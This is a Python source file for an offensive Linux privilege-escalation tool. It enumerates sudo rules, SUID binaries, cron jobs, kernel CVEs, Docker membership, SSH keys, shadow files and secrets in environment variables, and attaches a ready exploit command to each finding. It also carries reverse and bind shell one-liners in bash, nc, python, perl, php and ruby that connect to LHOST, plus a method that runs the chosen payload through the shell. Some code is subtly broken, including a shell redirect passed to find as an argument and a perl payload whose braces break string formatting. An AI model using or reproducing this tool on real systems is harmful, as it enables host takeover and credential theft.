import os
import sys
import subprocess
import re
import requests
import json
import base64
import time
import socket
import tempfile
import shutil
from threading import Thread

class PrivilegeEscalationScanner:
    def __init__(self):
        self.options = {
            "TARGET": "",
            "SESSION": "",
            "PAYLOAD": "reverse",
            "LHOST": "",
            "LPORT": "4444",
            "TIMEOUT": "10",
            "METHOD": "auto",
            "SUDO_CHECK": True,
            "SUID_CHECK": True,
            "CAPABILITIES_CHECK": True,
            "CRON_CHECK": True,
            "PATH_CHECK": True,
            "KERNEL_CHECK": True,
            "SERVICE_CHECK": True,
            "DOCKER_CHECK": True,
            "EXPLOIT_DB": True,
            "CUSTOM_EXPLOIT": "",
            "OUTPUT_FILE": "",
            "VERBOSE": False
        }
        
        self.priv_esc_methods = {
            "sudo": self.check_sudo_misconfig,
            "suid": self.check_suid_files,
            "capabilities": self.check_linux_capabilities,
            "cron": self.check_cron_jobs,
            "path": self.check_path_hijacking,
            "kernel": self.check_kernel_exploits,
            "services": self.check_misconfigured_services,
            "docker": self.check_docker_privileges,
            "wildcards": self.check_wildcard_injections,
            "env_vars": self.check_environment_variables,
            "ssh_keys": self.check_ssh_keys,
            "passwords": self.check_stored_passwords,
            "nfs": self.check_nfs_shares,
            "world_writable": self.check_world_writable_files,
            "sensitive_files": self.check_sensitive_files
        }
        
        self.kernel_exploits_db = [
            {"name": "Dirty Cow", "cve": "CVE-2016-5195", "versions": ["Linux Kernel < 4.8.0"]},
            {"name": "Dirty Pipe", "cve": "CVE-2022-0847", "versions": ["Linux Kernel 5.8 < 5.16.11, 5.16.11 < 5.17"]},
            {"name": "OverlayFS", "cve": "CVE-2021-3493", "versions": ["Ubuntu 20.10, Ubuntu 21.04"]},
            {"name": "Polkit", "cve": "CVE-2021-4034", "versions": ["Polkit < 0.119"]},
            {"name": "eBPF", "cve": "CVE-2022-23222", "versions": ["Linux Kernel < 5.16.12"]},
            {"name": "Netfilter", "cve": "CVE-2021-43267", "versions": ["Linux Kernel 5.4 < 5.16"]},
            {"name": "FUSE", "cve": "CVE-2022-1011", "versions": ["Linux Kernel < 5.17.2"]},
            {"name": "nft_object", "cve": "CVE-2022-1973", "versions": ["Linux Kernel 5.4 < 5.18"]},
            {"name": "Unix Sockets", "cve": "CVE-2021-22600", "versions": ["Linux Kernel < 5.11.12"]},
            {"name": "io_uring", "cve": "CVE-2022-1786", "versions": ["Linux Kernel 5.10 < 5.17"]}
        ]
        
        self.sudo_misconfigurations = [
            "ALL=(ALL) NOPASSWD: ALL",
            "ALL=(ALL:ALL) ALL",
            "ALL=(ALL) ALL",
            "ALL=(root) NOPASSWD: ALL",
            "ALL=(root) ALL"
        ]
        
        self.sensitive_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "/etc/hosts.allow",
            "/etc/hosts.deny",
            "/etc/crontab",
            "/etc/sysconfig/network-scripts/",
            "/etc/ssh/sshd_config",
            "/root/.ssh/authorized_keys",
            "/home/*/.ssh/authorized_keys",
            "/home/*/.ssh/id_rsa",
            "/var/log/auth.log",
            "/var/log/secure",
            "/etc/exports",
            "/etc/fstab",
            "/etc/group",
            "/etc/gshadow"
        ]
        
        self.world_writable_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/sudoers",
            "/etc/hosts.allow",
            "/etc/hosts.deny",
            "/etc/crontab",
            "/etc/sysconfig/network-scripts/",
            "/etc/ssh/sshd_config"
        ]
        
        self.cron_paths = [
            "/etc/cron.d/",
            "/etc/cron.daily/",
            "/etc/cron.hourly/",
            "/etc/cron.monthly/",
            "/etc/cron.weekly/",
            "/var/spool/cron/",
            "/var/spool/cron/crontabs/"
        ]
        
        self.path_hijacking_bins = [
            "wget", "curl", "nc", "netcat", "python", "perl", "ruby", "php", "gcc", "cc"
        ]
        
        self.exploit_payloads = {
            "reverse": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "bind": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
            "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
            "php": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        }
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def run(self):
        target = self.get_option("TARGET")
        method = self.get_option("METHOD").lower()
        verbose = self.get_option("VERBOSE")
        
        results = {
            "target": target,
            "vulnerabilities": [],
            "exploits": []
        }
        
        if method == "auto":
            for method_name, method_func in self.priv_esc_methods.items():
                if verbose:
                    print(f"[*] Running {method_name} check...")
                
                vulns = method_func()
                if vulns:
                    results["vulnerabilities"].extend(vulns)
        else:
            if method in self.priv_esc_methods:
                if verbose:
                    print(f"[*] Running {method} check...")
                
                vulns = self.priv_esc_methods[method]()
                if vulns:
                    results["vulnerabilities"].extend(vulns)
        
        if self.get_option("EXPLOIT_DB"):
            kernel_exploits = self.check_kernel_exploits()
            if kernel_exploits:
                results["exploits"].extend(kernel_exploits)
        
        if self.get_option("CUSTOM_EXPLOIT"):
            custom_exploit = self.run_custom_exploit()
            if custom_exploit:
                results["exploits"].append(custom_exploit)
        
        if self.get_option("OUTPUT_FILE"):
            with open(self.get_option("OUTPUT_FILE"), "w") as f:
                json.dump(results, f, indent=4)
        
        return results
    
    def check_sudo_misconfig(self):
        vulnerabilities = []
        
        try:
            sudo_output = subprocess.check_output(["sudo", "-l"], stderr=subprocess.STDOUT).decode("utf-8")
            
            for misconfig in self.sudo_misconfigurations:
                if misconfig in sudo_output:
                    vulnerabilities.append({
                        "type": "sudo_misconfiguration",
                        "description": f"Sudo misconfiguration: {misconfig}",
                        "severity": "high",
                        "exploit": f"Use sudo with {misconfig}"
                    })
            
            sudo_no_passwd = re.search(r"\(ALL : ALL\) NOPASSWD: (.+)", sudo_output)
            if sudo_no_passwd:
                vulnerabilities.append({
                    "type": "sudo_no_password",
                    "description": f"Sudo without password for: {sudo_no_passwd.group(1)}",
                    "severity": "high",
                    "exploit": f"sudo {sudo_no_passwd.group(1)}"
                })
            
            sudo_specific = re.findall(r"\(.*\) NOPASSWD: (.+)", sudo_output)
            if sudo_specific:
                for cmd in sudo_specific:
                    vulnerabilities.append({
                        "type": "sudo_specific_command",
                        "description": f"Sudo without password for specific command: {cmd}",
                        "severity": "medium",
                        "exploit": f"sudo {cmd}"
                    })
        except:
            pass
        
        return vulnerabilities
    
    def check_suid_files(self):
        vulnerabilities = []
        
        try:
            suid_files = subprocess.check_output(["find", "/", "-perm", "-4000", "-type", "f", "2>/dev/null"], stderr=subprocess.STDOUT).decode("utf-8").split("\n")
            
            for file in suid_files:
                if file:
                    if "nmap" in file:
                        vulnerabilities.append({
                            "type": "suid_nmap",
                            "description": f"SUID nmap binary: {file}",
                            "severity": "high",
                            "exploit": f"echo 'os.execute(\"/bin/sh\")' > /tmp/script.nse && sudo {file} --script=/tmp/script.nse"
                        })
                    elif "python" in file:
                        vulnerabilities.append({
                            "type": "suid_python",
                            "description": f"SUID python binary: {file}",
                            "severity": "high",
                            "exploit": f"{file} -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
                        })
                    elif "perl" in file:
                        vulnerabilities.append({
                            "type": "suid_perl",
                            "description": f"SUID perl binary: {file}",
                            "severity": "high",
                            "exploit": f"{file} -e 'exec \"/bin/sh\";'"
                        })
                    elif "php" in file:
                        vulnerabilities.append({
                            "type": "suid_php",
                            "description": f"SUID php binary: {file}",
                            "severity": "high",
                            "exploit": f"{file} -r 'shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                        })
                    elif "bash" in file:
                        vulnerabilities.append({
                            "type": "suid_bash",
                            "description": f"SUID bash binary: {file}",
                            "severity": "high",
                            "exploit": f"{file} -p"
                        })
                    else:
                        vulnerabilities.append({
                            "type": "suid_file",
                            "description": f"SUID file: {file}",
                            "severity": "medium",
                            "exploit": f"Check GTFOBins for {file}"
                        })
        except:
            pass
        
        return vulnerabilities
    
    def check_linux_capabilities(self):
        vulnerabilities = []
        
        try:
            cap_files = subprocess.check_output(["getcap", "-r", "/"], stderr=subprocess.STDOUT).decode("utf-8").split("\n")
            
            for line in cap_files:
                if line:
                    file, caps = line.split("=", 1)
                    
                    if "cap_setuid+ep" in caps:
                        vulnerabilities.append({
                            "type": "capability_setuid",
                            "description": f"File with cap_setuid capability: {file}",
                            "severity": "high",
                            "exploit": f"{file} -p"
                        })
                    
                    if "cap_dac_override+ep" in caps:
                        vulnerabilities.append({
                            "type": "capability_dac_override",
                            "description": f"File with cap_dac_override capability: {file}",
                            "severity": "medium",
                            "exploit": f"Use {file} to bypass file permissions"
                        })
                    
                    if "cap_sys_ptrace+ep" in caps:
                        vulnerabilities.append({
                            "type": "capability_sys_ptrace",
                            "description": f"File with cap_sys_ptrace capability: {file}",
                            "severity": "high",
                            "exploit": f"Use {file} to inject into other processes"
                        })
        except:
            pass
        
        return vulnerabilities
    
    def check_cron_jobs(self):
        vulnerabilities = []
        
        try:
            cron_output = subprocess.check_output(["crontab", "-l"], stderr=subprocess.STDOUT).decode("utf-8")
            
            if cron_output:
                vulnerabilities.append({
                    "type": "user_cron_jobs",
                    "description": "User has cron jobs configured",
                    "severity": "low",
                    "exploit": "Check cron jobs for weak permissions"
                })
        except:
            pass
        
        for cron_path in self.cron_paths:
            try:
                if os.path.exists(cron_path):
                    cron_files = os.listdir(cron_path)
                    
                    for file in cron_files:
                        file_path = os.path.join(cron_path, file)
                        
                        if os.path.isfile(file_path):
                            file_perms = oct(os.stat(file_path).st_mode)[-3:]
                            
                            if int(file_perms[0]) >= 6:
                                vulnerabilities.append({
                                    "type": "writable_cron_file",
                                    "description": f"Writable cron file: {file_path}",
                                    "severity": "high",
                                    "exploit": f"Add reverse shell to {file_path}"
                                })
            except:
                pass
        
        return vulnerabilities
    
    def check_path_hijacking(self):
        vulnerabilities = []
        
        try:
            path_dirs = os.environ.get("PATH", "").split(":")
            
            current_dir = os.getcwd()
            
            if current_dir in path_dirs:
                vulnerabilities.append({
                    "type": "current_dir_in_path",
                    "description": "Current directory is in PATH",
                    "severity": "medium",
                    "exploit": "Create a malicious binary in current directory"
                })
            
            writable_dirs = []
            
            for dir_path in path_dirs:
                if os.path.isdir(dir_path):
                    if os.access(dir_path, os.W_OK):
                        writable_dirs.append(dir_path)
            
            for dir_path in writable_dirs:
                for binary in self.path_hijacking_bins:
                    binary_path = os.path.join(dir_path, binary)
                    
                    if not os.path.exists(binary_path):
                        vulnerabilities.append({
                            "type": "path_hijacking",
                            "description": f"Writable directory in PATH: {dir_path}",
                            "severity": "high",
                            "exploit": f"Create malicious {binary} in {dir_path}"
                        })
        except:
            pass
        
        return vulnerabilities
    
    def check_kernel_exploits(self):
        vulnerabilities = []
        
        try:
            kernel_version = subprocess.check_output(["uname", "-r"], stderr=subprocess.STDOUT).decode("utf-8").strip()
            
            for exploit in self.kernel_exploits_db:
                for version in exploit["versions"]:
                    if version in kernel_version or kernel_version.startswith(version.split("<")[0].strip()):
                        vulnerabilities.append({
                            "type": "kernel_exploit",
                            "name": exploit["name"],
                            "cve": exploit["cve"],
                            "description": f"Kernel version {kernel_version} is vulnerable to {exploit['name']} ({exploit['cve']})",
                            "severity": "critical",
                            "exploit": f"Search for {exploit['cve']} exploit"
                        })
        except:
            pass
        
        return vulnerabilities
    
    def check_misconfigured_services(self):
        vulnerabilities = []
        
        try:
            services = subprocess.check_output(["systemctl", "list-units", "--type=service", "--state=running", "--no-pager"], stderr=subprocess.STDOUT).decode("utf-8")
            
            if "mysql" in services.lower():
                vulnerabilities.append({
                    "type": "mysql_service",
                    "description": "MySQL service is running",
                    "severity": "low",
                    "exploit": "Check for weak MySQL credentials"
                })
            
            if "postgresql" in services.lower():
                vulnerabilities.append({
                    "type": "postgresql_service",
                    "description": "PostgreSQL service is running",
                    "severity": "low",
                    "exploit": "Check for weak PostgreSQL credentials"
                })
            
            if "apache" in services.lower() or "nginx" in services.lower():
                vulnerabilities.append({
                    "type": "web_server_service",
                    "description": "Web server service is running",
                    "severity": "low",
                    "exploit": "Check for web server vulnerabilities"
                })
            
            if "docker" in services.lower():
                vulnerabilities.append({
                    "type": "docker_service",
                    "description": "Docker service is running",
                    "severity": "medium",
                    "exploit": "Check if user is in docker group"
                })
        except:
            pass
        
        try:
            if os.path.exists("/etc/systemd/system/"):
                systemd_services = os.listdir("/etc/systemd/system/")
                
                for service in systemd_services:
                    if service.endswith(".service"):
                        service_path = os.path.join("/etc/systemd/system/", service)
                        
                        try:
                            with open(service_path, "r") as f:
                                service_content = f.read()
                                
                                if "User=root" in service_content and "Group=root" in service_content:
                                    vulnerabilities.append({
                                        "type": "privileged_service",
                                        "description": f"Service running as root: {service}",
                                        "severity": "medium",
                                        "exploit": f"Check {service} for vulnerabilities"
                                    })
                        except:
                            pass
        except:
            pass
        
        return vulnerabilities
    
    def check_docker_privileges(self):
        vulnerabilities = []
        
        try:
            groups = subprocess.check_output(["groups"], stderr=subprocess.STDOUT).decode("utf-8")
            
            if "docker" in groups:
                vulnerabilities.append({
                    "type": "docker_group",
                    "description": "User is in docker group",
                    "severity": "high",
                    "exploit": "docker run -v /:/host -it ubuntu bash"
                })
        except:
            pass
        
        try:
            if os.path.exists("/.dockerenv"):
                vulnerabilities.append({
                    "type": "inside_docker_container",
                    "description": "Running inside a Docker container",
                    "severity": "medium",
                    "exploit": "Check for container escape vulnerabilities"
                })
        except:
            pass
        
        return vulnerabilities
    
    def check_wildcard_injections(self):
        vulnerabilities = []
        
        try:
            cron_output = subprocess.check_output(["crontab", "-l"], stderr=subprocess.STDOUT).decode("utf-8")
            
            if "*" in cron_output:
                vulnerabilities.append({
                    "type": "wildcard_in_cron",
                    "description": "Wildcard characters in cron jobs",
                    "severity": "medium",
                    "exploit": "Create malicious files to trigger wildcard injection"
                })
        except:
            pass
        
        for cron_path in self.cron_paths:
            try:
                if os.path.exists(cron_path):
                    cron_files = os.listdir(cron_path)
                    
                    for file in cron_files:
                        file_path = os.path.join(cron_path, file)
                        
                        if os.path.isfile(file_path):
                            with open(file_path, "r") as f:
                                content = f.read()
                                
                                if "*" in content:
                                    vulnerabilities.append({
                                        "type": "wildcard_in_cron_file",
                                        "description": f"Wildcard characters in cron file: {file_path}",
                                        "severity": "medium",
                                        "exploit": f"Create malicious files to trigger wildcard injection in {file_path}"
                                    })
            except:
                pass
        
        return vulnerabilities
    
    def check_environment_variables(self):
        vulnerabilities = []
        
        try:
            env_vars = os.environ
            
            for var, value in env_vars.items():
                if "pass" in var.lower() or "pwd" in var.lower():
                    vulnerabilities.append({
                        "type": "password_in_env",
                        "description": f"Password in environment variable: {var}",
                        "severity": "high",
                        "exploit": f"Use password: {value}"
                    })
                
                if "token" in var.lower():
                    vulnerabilities.append({
                        "type": "token_in_env",
                        "description": f"Token in environment variable: {var}",
                        "severity": "high",
                        "exploit": f"Use token: {value}"
                    })
                
                if "key" in var.lower():
                    vulnerabilities.append({
                        "type": "key_in_env",
                        "description": f"Key in environment variable: {var}",
                        "severity": "high",
                        "exploit": f"Use key: {value}"
                    })
                
                if "LD_PRELOAD" in var:
                    vulnerabilities.append({
                        "type": "ld_preload",
                        "description": "LD_PRELOAD environment variable is set",
                        "severity": "high",
                        "exploit": "Create malicious shared library to preload"
                    })
        except:
            pass
        
        return vulnerabilities
    
    def check_ssh_keys(self):
        vulnerabilities = []
        
        ssh_paths = [
            "/root/.ssh/",
            "/home/*/.ssh/"
        ]
        
        for path_pattern in ssh_paths:
            try:
                import glob
                paths = glob.glob(path_pattern)
                
                for path in paths:
                    if os.path.exists(path):
                        ssh_files = os.listdir(path)
                        
                        for file in ssh_files:
                            file_path = os.path.join(path, file)
                            
                            if os.path.isfile(file_path):
                                with open(file_path, "r") as f:
                                    content = f.read()
                                    
                                    if "PRIVATE KEY" in content:
                                        vulnerabilities.append({
                                            "type": "ssh_private_key",
                                            "description": f"SSH private key found: {file_path}",
                                            "severity": "high",
                                            "exploit": f"Use SSH key: {file_path}"
                                        })
                                    
                                    if "-----BEGIN" in content and "-----END" in content:
                                        vulnerabilities.append({
                                            "type": "ssh_key",
                                            "description": f"SSH key found: {file_path}",
                                            "severity": "high",
                                            "exploit": f"Use SSH key: {file_path}"
                                        })
            except:
                pass
        
        return vulnerabilities
    
    def check_stored_passwords(self):
        vulnerabilities = []
        
        password_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/master.passwd",
            "/etc/group",
            "/etc/gshadow"
        ]
        
        for file_path in password_files:
            try:
                if os.path.exists(file_path):
                    with open(file_path, "r") as f:
                        content = f.read()
                        
                        if file_path == "/etc/shadow" or file_path == "/etc/master.passwd":
                            vulnerabilities.append({
                                "type": "shadow_file",
                                "description": f"Shadow file readable: {file_path}",
                                "severity": "high",
                                "exploit": f"Crack passwords from {file_path}"
                            })
                        
                        if "root::" in content:
                            vulnerabilities.append({
                                "type": "root_no_password",
                                "description": "Root account has no password",
                                "severity": "critical",
                                "exploit": "su - root"
                            })
            except:
                pass
        
        config_files = [
            "/etc/ssh/sshd_config",
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/etc/mysql/my.cnf",
            "/etc/postgresql/*/main/pg_hba.conf"
        ]
        
        for file_pattern in config_files:
            try:
                import glob
                files = glob.glob(file_pattern)
                
                for file_path in files:
                    if os.path.exists(file_path):
                        with open(file_path, "r") as f:
                            content = f.read()
                            
                            if "PasswordAuthentication yes" in content:
                                vulnerabilities.append({
                                    "type": "ssh_password_auth",
                                    "description": "SSH allows password authentication",
                                    "severity": "medium",
                                    "exploit": "Try SSH password brute force"
                                })
                            
                            if "PermitRootLogin yes" in content:
                                vulnerabilities.append({
                                    "type": "ssh_root_login",
                                    "description": "SSH allows root login",
                                    "severity": "high",
                                    "exploit": "Try SSH root login"
                                })
            except:
                pass
        
        return vulnerabilities
    
    def check_nfs_shares(self):
        vulnerabilities = []
        
        try:
            if os.path.exists("/etc/exports"):
                with open("/etc/exports", "r") as f:
                    exports_content = f.read()
                    
                    if "no_root_squash" in exports_content:
                        vulnerabilities.append({
                            "type": "nfs_no_root_squash",
                            "description": "NFS share with no_root_squash option",
                            "severity": "high",
                            "exploit": "Mount NFS share and create SUID binary"
                        })
                    
                    if "all_squash" not in exports_content and "root_squash" not in exports_content:
                        vulnerabilities.append({
                            "type": "nfs_no_squash",
                            "description": "NFS share without squash option",
                            "severity": "medium",
                            "exploit": "Mount NFS share and access files"
                        })
        except:
            pass
        
        try:
            nfs_mounts = subprocess.check_output(["mount", "-t", "nfs"], stderr=subprocess.STDOUT).decode("utf-8")
            
            if nfs_mounts:
                vulnerabilities.append({
                    "type": "nfs_mounted",
                    "description": "NFS shares are mounted",
                    "severity": "low",
                    "exploit": "Check mounted NFS shares for vulnerabilities"
                })
        except:
            pass
        
        return vulnerabilities
    
    def check_world_writable_files(self):
        vulnerabilities = []
        
        for file_path in self.world_writable_files:
            try:
                if os.path.exists(file_path):
                    file_perms = oct(os.stat(file_path).st_mode)[-3:]
                    
                    if int(file_perms[2]) >= 2:
                        vulnerabilities.append({
                            "type": "world_writable_file",
                            "description": f"World writable file: {file_path}",
                            "severity": "high",
                            "exploit": f"Modify {file_path} to gain privileges"
                        })
            except:
                pass
        
        try:
            world_writable_dirs = subprocess.check_output(["find", "/", "-type", "d", "-perm", "-o+w", "2>/dev/null"], stderr=subprocess.STDOUT).decode("utf-8").split("\n")
            
            for dir_path in world_writable_dirs:
                if dir_path:
                    vulnerabilities.append({
                        "type": "world_writable_dir",
                        "description": f"World writable directory: {dir_path}",
                        "severity": "medium",
                        "exploit": f"Create malicious files in {dir_path}"
                    })
        except:
            pass
        
        return vulnerabilities
    
    def check_sensitive_files(self):
        vulnerabilities = []
        
        for file_path in self.sensitive_paths:
            try:
                if os.path.exists(file_path):
                    if os.path.isfile(file_path):
                        file_perms = oct(os.stat(file_path).st_mode)[-3:]
                        
                        if int(file_perms[0]) >= 4:
                            vulnerabilities.append({
                                "type": "readable_sensitive_file",
                                "description": f"Readable sensitive file: {file_path}",
                                "severity": "high",
                                "exploit": f"Read {file_path} for sensitive information"
                            })
                        
                        if int(file_perms[1]) >= 2:
                            vulnerabilities.append({
                                "type": "writable_sensitive_file",
                                "description": f"Writable sensitive file: {file_path}",
                                "severity": "critical",
                                "exploit": f"Modify {file_path} to gain privileges"
                            })
            except:
                pass
        
        try:
            hidden_files = subprocess.check_output(["find", "/", "-name", ".*", "-type", "f", "2>/dev/null"], stderr=subprocess.STDOUT).decode("utf-8").split("\n")
            
            for file_path in hidden_files:
                if file_path:
                    try:
                        file_perms = oct(os.stat(file_path).st_mode)[-3:]
                        
                        if int(file_perms[0]) >= 4:
                            vulnerabilities.append({
                                "type": "readable_hidden_file",
                                "description": f"Readable hidden file: {file_path}",
                                "severity": "medium",
                                "exploit": f"Read {file_path} for sensitive information"
                            })
                    except:
                        pass
        except:
            pass
        
        return vulnerabilities
    
    def run_custom_exploit(self):
        exploit_path = self.get_option("CUSTOM_EXPLOIT")
        
        if not exploit_path or not os.path.exists(exploit_path):
            return None
        
        try:
            exploit_output = subprocess.check_output([exploit_path], stderr=subprocess.STDOUT).decode("utf-8")
            
            return {
                "type": "custom_exploit",
                "description": f"Ran custom exploit: {exploit_path}",
                "severity": "unknown",
                "output": exploit_output
            }
        except:
            return None
    
    def generate_payload(self):
        payload_type = self.get_option("PAYLOAD").lower()
        lhost = self.get_option("LHOST")
        lport = self.get_option("LPORT")
        
        if payload_type in self.exploit_payloads:
            payload = self.exploit_payloads[payload_type]
            payload = payload.format(LHOST=lhost, LPORT=lport)
            
            return payload
        
        return None
    
    def execute_payload(self):
        payload = self.generate_payload()
        
        if not payload:
            return False
        
        try:
            subprocess.run(payload, shell=True, check=True)
            return True
        except:
            return False
